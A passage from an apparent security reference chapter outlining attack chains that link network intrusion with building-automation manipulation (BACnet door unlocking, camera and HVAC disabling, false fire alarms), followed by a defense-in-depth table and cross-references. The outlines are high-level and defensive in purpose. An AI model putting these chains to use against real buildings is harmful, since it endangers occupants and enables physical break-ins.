   If BAS VLAN is reachable (flat network or misconfigured trunk):
   enumerate BACnet devices, identify HVAC / door controllers
   ↓
7. MANIPULATE PHYSICAL CONTROLS
   Write BACnet values to unlock doors, disable HVAC, trigger
   false alarms — enabling deeper physical penetration or
   causing operational disruption
   ↓
8. EXFILTRATE / PERSIST
   Use physical access + network access for data exfiltration
   or long-term persistence (implant remains active until discovered)
```

**Attack chain: Network compromise → physical manipulation:**

```
1. NETWORK ENTRY
   Phishing, exploit, or credential compromise → initial access
   to corporate network
   ↓
2. LATERAL MOVEMENT TO BAS SEGMENT
   Pivot from corporate VLAN to BAS VLAN (if segmentation is
   weak or shared credentials exist)
   ↓
3. BAS ENUMERATION
   Discover BACnet/KNX/Modbus devices, map building systems
   ↓
4. PHYSICAL IMPACT
   - Disable security cameras (write offline command to NVR)
   - Unlock doors (if PACS integrates via BACnet/BAS)
   - Trigger fire alarm (forced evacuation → uncontrolled access)
   - Disable HVAC to server room (thermal damage)
   ↓
5. PHYSICAL FOLLOW-UP
   Insider or external team enters facility during disruption
   window created by network-initiated physical manipulation
```

**Defense-in-depth against convergence attacks:**

| Layer | Control | Purpose |
|-------|---------|---------|
| **Physical perimeter** | Mantraps, anti-passback, guard challenge | Prevent unauthorized physical entry |
| **Network port security** | 802.1X, NAC, disabled unused ports | Prevent implant deployment even if physical access is gained |
| **Network segmentation** | BAS on isolated VLAN, no IT-BAS route without firewall | Prevent lateral movement from IT to BAS and vice versa |
| **BAS protocol security** | BACnet/SC, KNX Secure, Modbus isolation | Prevent unauthorized BAS command injection |
| **BAS monitoring** | ICS/BAS IDS (Claroty, Nozomi, Dragos) | Detect anomalous BAS commands |
| **Physical inspection** | Scheduled infrastructure audits (§19G, §19K.3) | Detect implants before they are used |
| **Cross-domain correlation** | Physical SIEM integration (§19I.7) | Correlate physical access events with network events for compound attack detection |

---

## 19. Cross-references

**To Domain 7 (hardware vulnerabilities):** Power analysis (§17.1) and EM analysis (§17.2) underlie PLATYPUS (Chapter 7B §3.1). Fault injection overview connects to Plundervolt (Chapter 7B §1.3). USB attacks (§7) exploit the same HID trust model as BadUSB research (Chapter 7B §4).

**To Domain 12 (reverse engineering):** JTAG/SWD and UART (Chapters 17C–17D) are the hardware debug interfaces covered in Chapter 12B §2.2–2.3. Firmware extraction feeds into the firmware analysis workflow of Chapter 12B §3. Network implants (§8) may be discovered during traffic analysis (Chapter 12A).

**To Domain 13 (cryptography):** DPA/CPA targets AES internals (Chapter 13A §1.5). Cold boot attacks (§10) target in-memory key material. TEMPEST/emanation attacks (§12) target all cleartext signal processing.

**To Domain 15 (mobile):** RFID/NFC badge cloning techniques (§4) use the same NFC stack as mobile payment and access (Chapter 15A §3). Evil maid attacks (§11) on mobile devices target the secure boot chains described in Chapters 15A–15B.

**To Domain 17, Chapter 17B (fault injection):** Voltage/clock/EM/laser glitching, DFA, crowbar design, ChipWhisperer methodology, secure-boot bypass case studies (STM32 RDP, ESP32, nRF52, Tegra X1), countermeasures (dual-rail logic, sensor-based detection, instruction redundancy).

**To Domain 17, Chapter 17C (PCB RE and chip analysis):** PCB delayering, X-ray CT, chip decapsulation chemistry, SEM/FIB/TEM, memory extraction (NAND/NOR/eMMC/UFS), hardware Trojans, counterfeit IC detection, anti-tamper PCB design.

**To Domain 17, Chapter 17D (debug interfaces and secure boot):** IEEE 1149.1 TAP state machine, SWD protocol, ARM CoreSight, JTAGulator, secure boot architectures (ARM TF-A, UEFI, Intel Boot Guard, AMD PSB, Qualcomm, NXP HABv4), secure boot bypass (checkm8, BootHole, SPI modification, DFU exploits).

**To Domain 19 (supply chain security):** Physical interdiction (§16) is the hardware instantiation of supply chain compromise covered in Chapter 19C. Detection methods (X-ray, RF analysis, firmware hashing) complement the software supply chain integrity measures in Chapter 19A.

**To Domain 27 (endpoint and platform security):** TPM measured boot (§11.3), BitLocker integration, UEFI Secure Boot, and cold boot countermeasures (§10.3) connect to the platform integrity mechanisms in Chapter 27A. USBGuard (§7.5) is an endpoint hardening control.
